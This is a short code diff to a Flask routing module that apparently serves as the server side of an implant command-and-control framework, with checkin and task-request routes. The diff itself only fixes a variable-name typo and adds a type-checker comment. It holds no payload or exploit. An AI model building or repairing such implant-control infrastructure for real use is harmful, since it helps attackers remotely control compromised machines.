@@ -1,6 +1,6 @@
 # rpc blueprint - Implant <--> Server
 
-from flask import Blueprint, request , abort 
+from flask import Blueprint, request , abort  # type: ignore
 
 from cvnt.implant_pb2 import * 
 
@@ -53,7 +53,7 @@ def checkin():
     response = analyze_TaskResponse(ic.Resp)
 
     # Send TaskRequest back or "" (if no tasks)
-    return reponse
+    return response
 
 @rpc.route("/task/request", methods=["POST"])
 def send_task():
